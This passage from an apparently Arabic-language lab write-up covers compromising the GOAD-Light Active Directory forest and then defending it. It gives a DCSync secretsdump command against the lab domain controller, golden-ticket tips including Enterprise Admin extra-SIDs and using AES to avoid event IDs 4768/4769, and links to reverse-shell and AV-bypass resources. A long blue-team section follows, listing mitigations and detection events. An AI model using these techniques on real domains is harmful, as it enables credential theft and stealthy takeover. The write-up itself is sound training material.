قدرنا نسجل دخول وبعدين استوعبت ان دام التذكره شغاله اقدر اسوي دمب واجيب الهاشز حق الدومين واسجل دخول زي البشر بدون ريفيرس شيل
![](/Assets/images/GOAD-Light/iq-low.jpg)
``` bash
impacket-secretsdump north.sevenkingdoms.local/administrator@kingslanding.sevenkingdoms.local -no-pass -k -just-dc
```
![](/Assets/images/GOAD-Light/Kingslanding-DUMP.png)

وبكذا سوينا تيك اوفر للفوريست !
![](/Assets/images/GOAD-Light/Thanos.gif)

**Tips & Tricks**:
- وانت تزور التيكيت، تأكد ان اليوزر اللي بتنتحله يكون **Administrator**.
- استخدم ال **extra-sid** اوبشن للبارنت دومين مع - 519 عشان تكون التذكره انتيربرايس ادمن وتدخل الدومين وانت ادمن عشان الدمب
هذي لستة لل [SIDs](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/Windows%20SID.md#:~:text=5%2D21root%20domain%2D-,519,-Enterprise%20Admins)
- لبعد الشبهات ممكن تستخدم **AES** بدل **NTHASH** عشان تتجنب الايفينت آيديز **4768** & **4769**

حط تاريخ انتهاء صلاحية معقول للتذكرة لأن الطبيعي رايح يكون ١٠ سنين

وإذا في فرصة ، ممكن تستخدم
 **[Diamond Ticket](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/diamond-ticket.html)** بدل القولدن
- استخدم القولدن تيكيت للدمب بدل ماتحاول تجيب شيل
- مرات ممكن تواجه إعاقات وممكن تكون مشكله DNS او الفيرشوال ماشينز. تأكد ان كل شي شغال تمام
- Follow a mindmap and use tools instead of being random and all over the place, you will get lost. 
- امشي على مايند ماب بدل ماتكون ماشي عشوائي وتضيع
[MINDMAP](https://mayfly277.github.io/posts/AD-mindmap-2k25/)
- لا تعتمد على الذكاء الصناعي كثير هيتوهك واذا حسيت انك طفشت خذ لك استراحه وروق وارجع كمل

**مهم:** كان في ثغرتين تخطيتها اللي هي

 **ESC1** و **ESC8** لأن حاولت فيها كثير وماشتغلت معي وتأكدت من اللاب لأني سويت النسخه اللايت وطلع مافيها اصلا فلو راح تسوي اللايت ممكن تتخطاها


## Post Exploitation
الآن بعد ماسويت تيك اوفر ايش الخطوة اللي بعدها؟ في حاجات كثير ممكن تسويها مثلا تضيف حساب وتخليه ادمن وتدخله اي وقت، او تخلي وحده من الحسابات الغير مستخدمه ادمن او تضيف ملف كي لوجر او باك دور او رانسوم وير الاحتمالات ماتوقف
انت الان تعلمت ك ريد تيمر تحصل ثغرات وتخترقها وتبغلها الشركة للتعديل قبل مايتم اختراقهم من غيرك لأسباب غير شرعية الوحدة اللي تحت راح نتكلم عن كيف تصيد الهجمات اللي سويناها كمدافع وكيف تحلها وتقفلها او تقلل من حدوثها
# MITRE ATT&CK Mapping

| **Tool / Concept**                        | **MITRE ATT&CK Tactic**                                 | **MITRE ATT&CK Technique**                                                                | **Technique ID**                 |
| ----------------------------------------- | ------------------------------------------------------- | ----------------------------------------------------------------------------------------- | -------------------------------- |
| **Nmap Scan**                             | Discovery                                               | Network Service Discovery                                                                 | T1046                            |
| **Enum4Linux**                            | Discovery                                               | Account Discovery<br><br>  <br><br>Network Share Discovery                                | T1087<br><br>  <br><br>T1135     |
| **BloodHound Mapping**                    | Discovery                                               | Domain Trust Discovery<br><br>  <br><br>Permission Groups Discovery                       | T1482<br><br>  <br><br>T1069.002 |
| **Password Spraying**                     | Credential Access                                       | Brute Force: Password Spraying                                                            | T1110.003                        |
| **LLMNR / NBT-NS Poisoning (Responder)**  | Credential Access                                       | Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay                             | T1557.001                        |
| **AS-REP Roasting**                       | Credential Access                                       | Steal or Forge Kerberos Tickets: AS-REP Roasting                                          | T1558.004                        |
| **Kerberoasting**                         | Credential Access                                       | Steal or Forge Kerberos Tickets: Kerberoasting                                            | T1558.003                        |
| **Password in LDAP Description**          | Credential Access                                       | Unsecured Credentials: Credentials in Files/AD                                            | T1552                            |
| **IIS File Upload to Reverse Shell**      | Initial Access<br><br>  <br><br>Persistence             | Exploit Public-Facing Application<br><br>  <br><br>Server Software Component: Web Shell   | T1190<br><br>  <br><br>T1505.003 |
| **PrintSpoofer (SeImpersonatePrivilege)** | Privilege Escalation                                    | Access Token Manipulation: Token Impersonation/Theft                                      | T1134.001                        |
| **MSSQL Trusted Link & Execute As**       | Lateral Movement<br><br>  <br><br>Execution             | Remote Services<br><br>  <br><br>Command and Scripting Interpreter: Windows Command Shell | T1021<br><br>  <br><br>T1059.003 |
| **Cross-Forest Group Hopping**            | Lateral Movement                                        | Use Alternate Authentication Material                                                     | T1550                            |
| **DCSync (secretsdump.py)**               | Credential Access                                       | OS Credential Dumping: DCSync                                                             | T1003.006                        |
| **Golden Ticket Forging (ExtraSIDs)**     | Credential Access<br><br>  <br><br>Privilege Escalation | Steal or Forge Kerberos Tickets: Golden Ticket                                            | T1558.001                        |

# Blue Teaming 
قدرنا نخترق ونسوي تيك اوفر للفوريست، لكن كيف ممكن ندافع ونوقف شي كذا من انه يصير؟ ايش هي الثغرات اللي المهاجم اخترقها وكيف ممكن نشوفها؟ في ذي الوحده بنتكلم عن ذا الشي بإتباع نفس الخطوات اللي اخذناها في الهجوم
## Network Reconnaissance
هذي أول خطوة في اي هجوم، هدفنا مو اننا نخلي الشبكة غير متوفرة او محد يقدر يوصلها لكن نقلل من الوصول إلى البورتات المهمة اللي ممكن يتم إختراقنا منها

- Host-based firewalls
- Network ACLs
- VLAN/network segmentation
- Remove unused services
- IDS/IPS

**مؤشرات تنتبه لها**
- High ARP/ICMP/TCP Handshakes In Traffic
- Sysmon IDs

هذا شكل الترافيك على واير شارك وقت مايكون في سكان للشبكة
``` bash
nmap -sS -sV <IP>
```
![](/Assets/images/GOAD-Light/Nmap-WS2.png)

![](/Assets/images/GOAD-Light/Nmap-WS1.png)

## SMB / LDAP Enumeration
استخدمنا **Enum4linux** عشان نجيب اول باسورد ودخلنا بيه السستم
عشان نمنع شي زي كذا من انه يصير نركز على اللي تحت

- قفل anonymous/guest access
- منع المستخدم العادي من انه يكون ادمن
- Review ACLs on AD objects
- Remove unused accounts and groups

هذي تقلل بشكل كبير المعلومات اللي ممكن يحصلها المهاجم بعد الدخول بإستخدام أدوات مثل **Bloodhound** كمثال

## Password Spraying
ممكن مايبين انها خطيرة لأن مين الفاضي اللي بيقعد يخمن باسوردات ويجيبها صح غير انه راح يكون في لوك اوت بعد محاولات كثير، لكن الوقاية خير العلاج ونحاول نمنع شي كذا من انه يصير لأن المهاجم ممكن يجيب باسوردات من تسريبات حسابات احدى الموظفين في الشركة او بالهندسة الإجتماعية
- باسوردات قوية وممنوع إعادة استخدام نفس الرمز
- MFA
- لستة باسوردات شائعة محظورة للإستخدام
- قفل او حذف الحسابات الغير مستخدمة
- فصل حسابات الآدمن من الحسابات العادية
- ركز على محاولات دخول فاشلة **على اكثر من حساب**.

**Windows EventIDs للملاحظة**
- 4625 — تسجيل دخول فاشل
- 4771 — Kerberos pre-authentication failed 
- 4776 — Domain controller attempted to validate credentials

Remember, attackers dont break in, they **log in**.

**Wireshark**
![](/Assets/images/GOAD-Light/PassSpray-WS1.png)

**Wazuh**
![](/Assets/images/GOAD-Light/PassSpray-SIEM.png)
## LLMNR/NBT-NS Poisoning
لقينا اثنين هاش لحسابين ووحده منهم كان ادمن باستخدام **MiTM** اتاك
استخدام بروتوكولات قديمة او ضعيفة تسهل على المهاجم فك شفرتها او ممكن استخدامها لتسجيل الدخول
- تطوير البروتوكولات
- قفل LLMNR
- قفل الغير مهم NBT-NS
- قفل WPAD functionality
- تشغيل SMB signing
- تقليل من استخدام NTLM
- فضل التسجيل ب Kerberos

ممكن تستخدم **Responder** عشان تشوف لو في حسابات تستخدم بروتوكلات قديمة

أفضل طريقة ممكن نصيد فيها هجوم كذا بإستخدام **Wireshark**, مع **Responder** شغال في الباكقراوند
![](/Assets/images/GOAD-Light/LLMNR-WS.png)
## AS-REP Roasting
التركيز الأساسي هنا على حسابات ال **kerberos pre-authentication** مقفل او غير مطلوب
```text
DONT_REQ_PREAUTH
```
شغل **kerberos pre-authentication** وتفرج على **AS-REQ** **(4768)** ايفينت.

**Wireshark**
![](/Assets/images/GOAD-Light/ASREP-WS.png)

**Wazuh**
![](/Assets/images/GOAD-Light/ASREP-Wazuh.png)

## Kerberoasting
فكينا شفرات باسوردات كثير بعد ماسوينا دمب بإستخدام **hashcat** وجبنا حسابات مهمة خلتنا نسوي تيك اوفر 

التركيز هنا كله على جودة الرمز

- استخدم باسوردات مو متسربة او شائعة
- قلل من ال SPNs.
- حذف الحسابات الغير مستخدمة
- Prefer modern Kerberos encryption and eliminate legacy encryption.

برضو ركز على الايفينت ايدي **Kerberos service ticket requests (4769)**. 

**Wireshark**
![](/Assets/images/GOAD-Light/Kerberoasting-WS.png)

**Wazuh**
![](/Assets/images/GOAD-Light/Kerberoasting-SIEM.png)

## Passwords Stored in LDAP/AD Attributes
أول رمز دخلنا على الدومين كونترولر كان مكتوب في الوصف تبع اليوزر تفادي هذا الشي سهل، لا تكتب الرمز في الهينت او تحطه في ورقه على الديسكتوب
- احذف الرموز المسربة
- استخدم password manager/secrets-management system
- شوف لو في اي تعديلات لملفات او حسابات حساسة
- تدريب الموظفين على الوعي السيبراني

## IIS File Upload Reverse Shell
جميلة جدا لمن تكون المهاجم بس توجع لمن تكون الضحية
- حدد ملفات معينة للرفع فقط زي PDF مثلا
- Validate MIME type **and** file content
- احفظ الملفات المرفوعة خارج الموقع
- احذفexecute permissions from upload locations
- Run IIS application pools with minimal privileges

**Wireshark**
![](/Assets/images/GOAD-Light/FileUpload-WS.png)

## PrintSpoofer / SeImpersonatePrivilege
الفايل ابلود كان الباب، لكن **SeImpersonatePrivilege** اللي خلانا راعي البيت
لولا البريفليج هذي ماكنا نقدر نصير ادمن والحل بسيط، حذف الحقوق العالية للحسابات الغير مؤهلة

- لا تشغل applications/services كآدمن
- اعزل الأجهزة المخترقة
- مونيتور ل suspicious child processes من service processes

**Wireshark**
![](/Assets/images/GOAD-Light/RS-WS.png)
هذا شكل الترافيك لمن المهاجم يحمل بيلود من جهازه على جهاز الضحية

**Wazuh**
![](/Assets/images/GOAD-Light/RS-Wazuh1.png)

![](/Assets/images/GOAD-Light/RS-Wazuh2-1.png)

## MSSQL Trusted Links / Execute As
جبنا ادمن اكسس بسبب ميسكونفيقريشن خلتنا ادمن واحنا يوزر عادي
برضو سوي ريفيو للتحت: 

- Linked servers.
- **EXECUTE** AS permissions.
- SQL Agent privileges.
- SQL service accounts.
- Cross-server trust relationships.

## Cross-Domain Privilege Abuse
بدينا في الشايلد دومين اللي هو *نورث* ورحنا للأب *سيفين كينق دومز* 
طبعا سوينا كذا بتزوير تيكيت ولكن ممكن نقلل من حدوث لاتيرال موفمنت بعد ماتركز عاللي تحت 

- Domain trusts
- SIDHistory
- Cross-domain group memberships
- Foreign security principals
- ACLs containing principals from other domains
- Delegation
- Enterprise Admin/Domain Admin membership
- Resource-based constrained delegation

أي حساب عليه آدمن بدون مبرر ممكن يسمح لنا نموف لاتيرالي

## Golden Ticket / ExtraSIDs
**القولدن تيكيت** هي اللي دخلتنا عالروت دومين بعد ماسوينا دمب للسيستم ولكن عشان نمنع أو نقلل من هذا النوع من الهجمات نسوي التالي:

- زيادة الحماية على الحسابات الحساسة privileged administrator accounts
- Protect Domain Controllers
- Monitor privileged access to domain controllers
- Monitor abnormal Kerberos authentication
- Audit SIDHistory and privileged group changes

**Wireshark**

تسجيل بإستخدام القولدن تيكيت المزورة
![](/Assets/images/GOAD-Light/GT-WS.png)

**Wazuh**
![](/Assets/images/GOAD-Light/GT-Wazuh.png)
برضو تابع الايفينت ايديز **4624**, **4672** و Sysmon ID **3**.

# Conclusion
هجمات الاكتيف دايريكتوري ممكن تكون معقدة اكثر من كذا وبكثير ويكون الديتيكشن اصعب بمراحل ولكن فهم الأساسيات والهجمات السهلة تهيئك للصعبة كمهاجم أو مدافع تحت بحط لكم ريسورسيز تفيدكم بشكل عام في الاكتيف دايريكتوري وغيرها ومع الممارسة وحل لابز مماثله لهذا كل شي يسهل ويهون وبالتوفيق للجميع :)

# Resources
- **Zeyad Azima**: <https://zeyadazima.com/>
- **FadyMoheb**: <https://fadymoheb.com/notes/Penetration-Testing/Network/Active-Directory/>
- **HackTricks**: <https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html>
- **The Hacker Recipes**: <https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/golden>
- **Darknet**: <https://www.darknet.org.uk>
- **ADSecurity**: <https://adsecurity.org/>
- **Reverse Shell Generator**: <https://www.revshells.com/>
- **AV Bypass**: <https://powersploit.readthedocs.io/en/latest/#antivirusbypass>
- **Discovery Commands**: <https://www.servicenow.com/docs/r/it-operations-management/discovery/powershell-cmdlets-run-by-discovery.html>
- **AD Detection Methodology**: <https://www.cyber.gov.au/business-government/detecting-responding-to-threats/detecting-and-mitigating-active-directory-compromises>